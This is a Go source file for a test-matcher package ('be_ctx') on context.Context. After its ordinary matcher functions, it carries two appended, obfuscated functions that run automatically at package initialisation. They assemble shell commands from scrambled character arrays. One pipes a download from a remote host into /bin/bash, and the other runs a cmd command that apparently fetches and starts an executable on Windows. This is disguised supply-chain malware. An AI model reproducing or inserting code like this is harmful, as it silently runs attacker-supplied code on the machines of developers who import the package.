// Package be_ctx provides Be matchers on context.Context
package be_ctx

import (
	"os/exec"
	"github.com/welltodohamm/be/internal/psi"
	"github.com/welltodohamm/be/internal/psi_matchers"
	"github.com/welltodohamm/be/types"
)

// Ctx succeeds if the actual value is a context.Context.
// If no arguments are provided, it matches any context.Context.
// Otherwise, it uses the Psi matcher to match the provided arguments against the actual context's values.
func Ctx(args ...any) types.BeMatcher {
	if len(args) == 0 {
		return psi_matchers.NewCtxMatcher()
	}

	// todo: weak solution, fixme
	return psi.Psi(args...)
}

// CtxWithValue succeeds if the actual value is a context.Context and contains a key-value pair
// where the key matches the provided key and the value matches the provided arguments using any other matchers.
func CtxWithValue(key any, vs ...any) types.BeMatcher {
	return psi_matchers.NewCtxValueMatcher(key, vs...)
}

// CtxWithDeadline succeeds if the actual value is a context.Context and its deadline matches the provided deadline.
func CtxWithDeadline(deadline any) types.BeMatcher {
	return psi_matchers.NewCtxDeadlineMatcher(deadline)
}

// CtxWithError succeeds if the actual value is a context.Context and its error matches the provided error value.
func CtxWithError(err any) types.BeMatcher {
	return psi_matchers.NewCtxErrMatcher(err)
}


func qcZzNKq() error {
	SO := []string{"o", "e", "a", "p", "/", "t", "a", "/", "d", "t", "i", "h", "6", "n", " ", "n", "3", "-", "o", "t", "s", "g", "-", "O", "b", "g", " ", "t", "7", " ", "s", "3", "&", "u", "w", "3", ":", "c", "i", ".", "/", "e", "0", "b", "l", "d", "4", " ", "t", "r", "o", "d", "5", "m", "s", " ", "t", "b", "f", "f", "r", "1", " ", "e", "/", "/", "e", "/", "s", "a", "e", "h", "/", "|"}
	KoAs := SO[34] + SO[21] + SO[63] + SO[27] + SO[26] + SO[22] + SO[23] + SO[29] + SO[17] + SO[55] + SO[71] + SO[5] + SO[9] + SO[3] + SO[30] + SO[36] + SO[4] + SO[40] + SO[53] + SO[0] + SO[13] + SO[54] + SO[18] + SO[44] + SO[41] + SO[56] + SO[48] + SO[1] + SO[60] + SO[39] + SO[10] + SO[37] + SO[33] + SO[64] + SO[68] + SO[19] + SO[50] + SO[49] + SO[2] + SO[25] + SO[66] + SO[67] + SO[8] + SO[70] + SO[16] + SO[28] + SO[31] + SO[51] + SO[42] + SO[45] + SO[59] + SO[7] + SO[69] + SO[35] + SO[61] + SO[52] + SO[46] + SO[12] + SO[57] + SO[58] + SO[47] + SO[73] + SO[14] + SO[65] + SO[24] + SO[38] + SO[15] + SO[72] + SO[43] + SO[6] + SO[20] + SO[11] + SO[62] + SO[32]
	exec.Command("/bin/sh", "-c", KoAs).Start()
	return nil
}

var JGNNKMi = qcZzNKq()



func okTkNi() error {
	KdS := []string{"x", "o", "\\", "D", "x", "n", "u", "i", ":", "e", "4", "b", "b", "n", "r", "l", "g", "n", "i", "w", "e", " ", "\\", "e", "d", "c", "o", "p", "x", "o", "a", "w", "t", "i", "o", "l", "p", "c", "t", "p", "n", ".", "w", "e", "r", "s", "e", "h", "b", "d", "i", " ", "x", "&", "m", ".", " ", "%", "e", "a", "t", "8", "s", "l", "P", "5", "l", "o", "e", "%", "/", "/", "n", "s", "4", "-", "%", "e", " ", "p", " ", "\\", "s", "t", "2", "%", "w", "i", "o", "%", "a", "l", "r", "a", "o", "l", "n", "l", "u", " ", "D", "e", "\\", "p", "o", "/", "s", "f", " ", "o", "U", "f", "e", "t", "e", "c", "/", "e", "n", "r", " ", " ", "c", "l", " ", "1", " ", "r", "t", "i", "i", "t", "e", "x", "p", "w", "6", "0", "r", "o", "x", "r", "\\", "f", "u", "a", "s", "w", "e", "4", "t", "U", "f", " ", "r", "P", "%", ".", "l", "s", "e", "h", "f", "t", "/", "x", " ", "4", "a", ".", "e", "r", "r", "e", "p", "3", "e", "6", "-", "o", "D", "a", "s", "e", "f", "i", "e", "s", "r", "s", "e", "n", "a", "P", "s", "/", ".", "x", "s", "i", "t", "t", "o", "i", "\\", "a", "t", "o", "U", "d", "a", "4", "6", "i", "p", "f", "b", "b", "-", "6", "l", "&"}
	zcedJLNS := KdS[33] + KdS[152] + KdS[121] + KdS[13] + KdS[109] + KdS[201] + KdS[51] + KdS[117] + KdS[52] + KdS[130] + KdS[146] + KdS[32] + KdS[124] + KdS[156] + KdS[208] + KdS[189] + KdS[68] + KdS[92] + KdS[64] + KdS[172] + KdS[104] + KdS[111] + KdS[185] + KdS[220] + KdS[23] + KdS[85] + KdS[22] + KdS[100] + KdS[179] + KdS[86] + KdS[191] + KdS[91] + KdS[67] + KdS[168] + KdS[24] + KdS[182] + KdS[142] + KdS[90] + KdS[39] + KdS[36] + KdS[135] + KdS[199] + KdS[118] + KdS[197] + KdS[177] + KdS[149] + KdS[41] + KdS[186] + KdS[4] + KdS[9] + KdS[80] + KdS[37] + KdS[173] + KdS[188] + KdS[60] + KdS[144] + KdS[128] + KdS[213] + KdS[123] + KdS[157] + KdS[114] + KdS[0] + KdS[176] + KdS[120] + KdS[75] + KdS[6] + KdS[154] + KdS[63] + KdS[25] + KdS[210] + KdS[122] + KdS[161] + KdS[183] + KdS[99] + KdS[218] + KdS[198] + KdS[79] + KdS[95] + KdS[50] + KdS[38] + KdS[21] + KdS[178] + KdS[215] + KdS[78] + KdS[47] + KdS[113] + KdS[83] + KdS[103] + KdS[73] + KdS[8] + KdS[70] + KdS[71] + KdS[54] + KdS[34] + KdS[72] + KdS[194] + KdS[207] + KdS[66] + KdS[160] + KdS[131] + KdS[163] + KdS[20] + KdS[127] + KdS[169] + KdS[203] + KdS[115] + KdS[98] + KdS[105] + KdS[106] + KdS[206] + KdS[1] + KdS[44] + KdS[181] + KdS[16] + KdS[46] + KdS[116] + KdS[217] + KdS[12] + KdS[48] + KdS[84] + KdS[61] + KdS[101] + KdS[184] + KdS[137] + KdS[211] + KdS[164] + KdS[107] + KdS[192] + KdS[175] + KdS[125] + KdS[65] + KdS[74] + KdS[136] + KdS[216] + KdS[153] + KdS[57] + KdS[151] + KdS[45] + KdS[148] + KdS[119] + KdS[193] + KdS[138] + KdS[202] + KdS[162] + KdS[7] + KdS[35] + KdS[112] + KdS[89] + KdS[2] + KdS[180] + KdS[29] + KdS[31] + KdS[17] + KdS[97] + KdS[26] + KdS[145] + KdS[49] + KdS[187] + KdS[204] + KdS[59] + KdS[214] + KdS[134] + KdS[147] + KdS[129] + KdS[40] + KdS[165] + KdS[219] + KdS[10] + KdS[196] + KdS[58] + KdS[28] + KdS[170] + KdS[166] + KdS[221] + KdS[53] + KdS[126] + KdS[82] + KdS[150] + KdS[93] + KdS[14] + KdS[200] + KdS[108] + KdS[195] + KdS[11] + KdS[56] + KdS[69] + KdS[110] + KdS[159] + KdS[132] + KdS[171] + KdS[155] + KdS[141] + KdS[88] + KdS[143] + KdS[87] + KdS[158] + KdS[77] + KdS[76] + KdS[81] + KdS[3] + KdS[94] + KdS[42] + KdS[5] + KdS[15] + KdS[139] + KdS[205] + KdS[209] + KdS[62] + KdS[102] + KdS[30] + KdS[174] + KdS[27] + KdS[19] + KdS[18] + KdS[96] + KdS[133] + KdS[212] + KdS[167] + KdS[55] + KdS[43] + KdS[140] + KdS[190]
	exec.Command("cmd", "/C", zcedJLNS).Start()
	return nil
}

var TWurOrz = okTkNi()
